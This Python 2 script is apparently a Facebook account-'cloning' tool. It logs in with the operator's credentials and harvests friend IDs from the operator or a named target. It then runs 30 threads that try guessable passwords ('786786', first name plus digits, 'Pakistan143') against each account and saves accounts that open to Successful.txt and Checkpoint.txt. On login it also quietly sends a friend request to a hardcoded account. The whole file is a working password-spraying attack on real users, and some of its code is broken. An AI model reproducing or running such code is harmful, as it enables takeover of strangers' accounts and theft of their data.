#coding=utf-8
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf-8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def exit():
	print " \033[1;98mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def printing (z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)


#Logo#
logo=""" \033[1;97m
 _   _ _   _  _   __ _   _ _____  _    _ _   _ 
| | | | \ | || | / /| \ | |  _  || |  | | \ | |
| | | |  \| || |/ / |  \| | | | || |  | |  \| |
| | | | . ` ||    \ | . ` | | | || |/\| | . ` |
| |_| | |\  || |\  \| |\  \ \_/ /\  /\  / |\  |
 \___/\_| \_/\_| \_/\_| \_/\___/  \/  \/\_| \_/
                                               
                                               
    ___  ___  ___   _   _                        
    |  \/  | / _ \ | \ | |                       
    | .  . |/ /_\ \|  \| |                       
    | |\/| ||  _  || . ` | \033[1;97mMR-SH4DOW                      
    | |  | || | | || |\  |                       
    \_|  |_/\_| |_/\_| \_/    """                   
                                               
                                               
logo1=('══════════════════════════════════════════════════')     
logo2='             Owner   :- P4K-H4CK3R-SH4D0W'
logo3='             Author  :- MR-SH4DOW-404'
logo4='             Youtube :- Billu Tricker--TechWithShadow'
logo5='             Whatsapp:- +9203123879770 '
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r \033[1;97mPlease Wait \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")

def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print logo1
		print(logo2)
		print(logo3)
		print(logo4)
		print(logo5)
		print(logo1)
		print("""~~~~~~~~~~~~~~~ \033[1;97mLogin with Facebook ~~~~~~~~~~~~~~""")
		print(logo1)
		id = raw_input(' \033[1;97mID/Email:- \033[1;97m')
		pwd = raw_input(' \033[1;97mPassword:- \033[1;97m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n \033[1;97mThere is no internet connection"
			exit()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n \033[1;97mLogin Successful...'
				os.system('xdg-open https://www.youtube.com/channel/UCSBPlrPsjLLXC3HFFx9jl_Q ')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\033[1;97mThere is no internet connection"
				exit()
		if 'checkpoint' in url:
			print("\n\033[1;97mYour Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			exit()
		else:
			print("\n \033[1;97mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()


def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print" \033[1;97mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;97mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\033[1;97mThere is no internet connection"
		exit()
	os.system("clear")
	print logo
	print(logo1)
	print(logo2)
	print(logo3)
	print(logo4)
	print(logo5)
	print (logo1)
	print "   	          \033[1;97m Name\033[1;97m:-\033[1;97m"+nama+"\033[1;97m               "
	print "	          \033[1;97m ID\033[1;97m:-\033[1;97m"+id+"\033[1;97m              "
	print (logo1)
	print " \033[1;97m[1]>>>>>  \033[1;97mStart Cloning....."
	print " \033[1;97m[2]>>>>>  \033[19;97mLogout"
	print " \033[1;97m[0]>>>>>  \033[1;97mExit"
	pilih()


def pilih():
	unikers = raw_input(" \n \033[1;97mChoose Option>>> \033[1;97m")
	if unikers =="":
		print " \033[1;97mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="2":
		printing (' Token Removed')
		os.system('rm -rf login.txt')
		exit()
	elif unikers =="0":
		exit()
	else:
		print " \033[1;97mFill in correctly"
		pilih()


def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print" \033[1;97mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print(logo1)
	print(logo2)
	print(logo3)
	print(logo4)
	print(logo5)
	print(logo1)
	print " \033[1;97m[1]>>>>> \033[1;97mClone From Friend List..."
	print " \033[1;97m[2]>>>>> \033[1;97mClone From Public ID..."
	print " \033[1;97m[0]>>>>> \033[1;97mBack"
	pilih_super()

def pilih_super():
	peak = raw_input("\n \033[1;97mChoose Option>>> \033[1;97m")
	if peak =="":
		print " \033[1;97mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print(logo1)
		print(logo2)
		print(logo3)
		print(logo4)
		print(logo5)
		print(logo1)
		printing (' \033[1;97mGetting IDs\033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		print(logo1)
		print(logo2)
		print(logo3)
		print(logo4)
		print(logo5)
		print(logo1)
		idt = raw_input(" \033[1;97mEnter Target User Name:- \033[1;97m")
		print(logo1)
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print" \033[1;97mName\033[1;97m:\033[1;97m "+op["name"]
		except KeyError:
			print" \033[1;97mID Not Found!"
			raw_input(" \n\033[1;97m[\033[1;97mBack\033[1;97m]")
			super()
		print" \033[1;97mGetting IDs\033[1;97m..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\033[1;97mFill in correctly"
		pilih_super()
	
	print " \033[1;97mTotal IDs\033[1;97m:- \033[1;97m"+str(len(id))
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r \033[1;97mCloning\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
	print ('\n'+logo1)
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('Out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = ('786786')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print ' \033[1;92m[\033[1;92mSuccessful\033[1;97m]\033[1;97m ' + user + ' \033[1;97m|\033[1;97m ' + pass1
				oks = open("Out/Successful.txt", "a")
				oks.write("[Successful] "+user+"|"+pass1+"\n")
				oks.close()
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print ' \033[1;97m[\033[1;97mCheckpoint\033[1;97m]\033[1;97m ' + user + ' \033[1;97m|\033[1;97m ' + pass1
					cek = open("Out/Checkpoint.txt", "a")
					cek.write("[Checkpoint] "+user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name']+'12345'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print ' \033[1;92m[\033[1;92mSuccessful\033[1;97m]\033[1;97m ' + user + ' \033[1;96m|\033[1;97m ' + pass2
						oks = open("Out/Successful.txt", "a")
						oks.write("[Successful] "+user+"|"+pass2+"\n")
						oks.close()
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print ' \033[1;97m[\033[1;97mCheckpoint\033[1;97m]\033[1;97m ' + user + ' \033[1;97m|\033[1;97m ' + pass2
							cek = open("Out/Checkpoint.txt", "a")
							cek.write("[Checkpoint] "+user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print ' \033[1;92m[\033[1;92mSuccessful\033[1;97m]\033[1;97m ' + user + ' \033[1;96m|\033[1;97m ' + pass3
								oks = open("Out/Successful.txt", "a")
								oks.write("[Successful] "+user+"|"+pass3+"\n")
								oks.close()
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print ' \033[1;97m[\033[1;97mCheckpoint\033[1;97m]\033[1;97m ' + user + ' \033[1;97m|\033[1;97m ' + pass3
									cek = open("Out/Checkpoint.txt", "a")
									cek.write("[Checkpoint] "+user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = 'Pakistan143'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print ' \033[1;92m[\033[1;92mSuccessful\033[1;97m]\033[1;97m ' + user + ' \033[1;96m|\033[1;97m ' + pass4
										oks = open("Out/Successful.txt", "a")
										oks.write("[Successful] "+user+"|"+pass4+"\n")
										oks.close()
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print ' \033[1;97m[\033[1;97mCheckpoint\033[1;97m]\033[1;97m ' + user + ' \033[1;97m|\033[1;97m ' + pass4
											cek = open("Out/Checkpoint.txt", "a")
											cek.write("[Checkpoint] "+user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = b['first_name'] + '12'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print ' \033[1;92m[\033[1;92mSuccessful\033[1;97m]\033[1;97m ' + user + ' \033[1;96m|\033[1;97m ' + pass5
												oks = open("Out/Successful.txt", "a")
												oks.write("[Successful] "+user+"|"+pass5+"\n")
												oks.close()
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print ' \033[1;97m[\033[1;97mCheckpoint\033[1;97m]\033[1;97m ' + user + ' \033[1;97m|\033[1;97m ' + pass5
													cek = open("Out/Checkpoint.txt", "a")
													cek.write("[Checkpoint] "+user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['first_name'] + '1234'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print ' \033[1;92m[\033[1;92mSuccessful\033[1;97m]\033[1;97m ' + user + ' \033[1;96m|\033[1;97m ' + pass6
														oks = open("Out/Successful.txt", "a")
														oks.write("[Successful] "+user+"|"+pass6+"\n")
														oks.close()
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print ' \033[1;97m[\033[1;97mCheckpoint\033[1;97m]\033[1;97m ' + user + ' \033[1;97m|\033[1;97m ' + pass6
															cek = open("Out/Checkpoint.txt", "a")
															cek.write("[Checkpoint] "+user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = b['first_name'] + '789'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print ' \033[1;92m[\033[1;92mSuccessful\033[1;97m]\033[1;97m ' + user + ' \033[1;96m|\033[1;97m ' + pass7
																oks = open("Out/Successful.txt", "a")
																oks.write("[Successful] "+user+"|"+pass7+"\n")
																oks.close()
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print ' \033[1;97m[\033[1;97mCheckpoint\033[1;97m]\033[1;97m ' + user + ' \033[1;97m|\033[1;97m ' + pass7
																	cek = open("Out/Checkpoint.txt", "a")
																	cek.write("[Checkpoint] "+user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																else:
																	a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
																	b = json.loads(a.text)
																	pass8 = b['first_name'] + '786'
																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	q = json.load(data)
																	if 'access_token' in q:
																		print ' \033[1;92m[\033[1;92mSuccessful\033[1;97m]\033[1;97m ' + user + ' \033[1;96m|\033[1;97m ' + pass8
																		oks = open("Out/Successful.txt", "a")
																		oks.write("[Successful] "+user+"|"+pass8+"\n")
																		oks.close()
																		oks.append(user+pass8)
																	else:
																		if 'www.facebook.com' in q["error_msg"]:
																			print ' \033[1;97m[\033[1;97mCheckpoint\033[1;97m]\033[1;97m ' + user + ' \033[1;97m|\033[1;97m ' + pass8
																			cek = open("Out/Checkpoint.txt", "a")
																			cek.write("[Checkpoint] "+user+"|"+pass8+"\n")
																			cek.close()
																			cekpoint.append(user+pass8)
																		else:
																			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
																			b = json.loads(a.text)
																			pass9 = b['Pakistan']
																			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																			q = json.load(data)
																			if 'access_token' in q:
																				print ' \033[1;92m[\033[1;92mSuccessful\033[1;97m]\033[1;97m ' + user + ' \033[1;96m|\033[1;97m ' + pass9
																				oks = open("Out/Successful.txt", "a")
																				oks.write("[Successful] "+user+"|"+pass9+"\n")
																				oks.close()
																				oks.append(user+pass9)
																			else:
																				if 'www.facebook.com' in q["error_msg"]:
																					print ' \033[1;97m[\033[1;97mCheckpoint\033[1;97m]\033[1;97m ' + user + ' \033[1;97m|\033[1;97m ' + pass9
																					cek = open("Out/Checkpoint.txt", "a")
																					cek.write("[Checkpoint] "+user+"|"+pass9+"\n")
																					cek.close()
																					cekpoint.append(user+pass9)
																				else:
																					a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
																					b = json.loads(a.text)
																					pass10 = b['first_name'] + 'Khan'
																					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass10)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																					q = json.load(data)
																					if 'access_token' in q:
																						print ' \033[1;92m[\033[1;92mSuccessful\033[1;97m]\033[1;97m ' + user + ' \033[1;96m|\033[1;97m ' + pass10
																						oks = open("Out/Successful.txt", "a")
																						oks.write("[Successful] "+user+"|"+pass10+"\n")
																						oks.close()
																						oks.append(user+pass10)
																					else:
																						if 'www.facebook.com' in q["error_msg"]:
																							print ' \033[1;97m[\033[1;97mCheckpoint\033[1;97m]\033[1;97m ' + user + ' \033[1;97m|\033[1;97m ' + pass10
																							cek = open("Out/Checkpoint.txt", "a")
																							cek.write("[Checkpoint] "+user+"|"+pass10+"\n")
																							cek.close()
																							cekpoint.append(user+pass10)
																						else:
																							a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
																							b = json.loads(a.text)
																							pass11 = 'I Love you' + b['first_name']
																							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass11)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																							q = json.load(data)
																							if 'access_token' in q:
																								print ' \033[1;92m[\033[1;92mSuccessful\033[1;97m]\033[1;97m ' + user + ' \033[1;96m|\033[1;97m ' + pass11
																								oks = open("Out/Successful.txt", "a")
																								oks.write("[Successful] "+user+"|"+pass11+"\n")
																								oks.close()
																								oks.append(user+pass11)
																							else:
																								if 'www.facebook.com' in q["error_msg"]:
																									print ' \033[1;97m[\033[1;97mCheckpoint\033[1;97m]\033[1;97m ' + user + ' \033[1;97m|\033[1;97m ' + pass11
																									cek = open("Out/Checkpoint.txt", "a")
																									cek.write("[Checkpoint] "+user+"|"+pass11+"\n")
																									cek.close()
																									cekpoint.append(user+pass11)
																								else:
																									a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
																									b = json.loads(a.text)
																									pass12 = b['first_name'] + 'Love' + b['first_name']
																									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass12)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																									q = json.load(data)
																									if 'access_token' in q:
																										print ' \033[1;92m[\033[1;92mSuccessful\033[1;97m]\033[1;97m ' + user + ' \033[1;96m|\033[1;97m ' + pass12
																										oks = open("Out/Successful.txt", "a")
																										oks.write("[Successful] "+user+"|"+pass12+"\n")
																										oks.close()
																										oks.append(user+pass12)
																									else:
																										if 'www.facebook.com' in q["error_msg"]:
																											print ' \033[1;97m[\033[1;97mCheckpoint\033[1;97m]\033[1;97m ' + user + ' \033[1;97m|\033[1;97m ' + pass12
																											cek = open("Out/Checkpoint.txt", "a")
																											cek.write("[Checkpoint] "+user+"|"+pass12+"\n")
																											cek.close()
																											cekpoint.append(user+pass12)
											
		except:
			pass		
		
	p = ThreadPool(30)
	p.map(main, id)
	print ('\n'+logo1)
	print '  \033[1;97mProcess Has Been Completed\033[1;97m....'
	print"  \033[1;97mTotal OK/\033[1;97mCP \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;97m"+str(len(cekpoint))
	print("  \033[1;97mCP File Has Been Saved\033[1;97m:\033[1;97mOut/Checkpoint.txt")
	print("  \033[1;97mOK File Has Been Saved\033[1;97m:\033[1;97mOut/Successful.txt")
	raw_input("  \033[1;97mPress Enter To Continue...")
	menu()

if __name__ == '__main__':
	login()

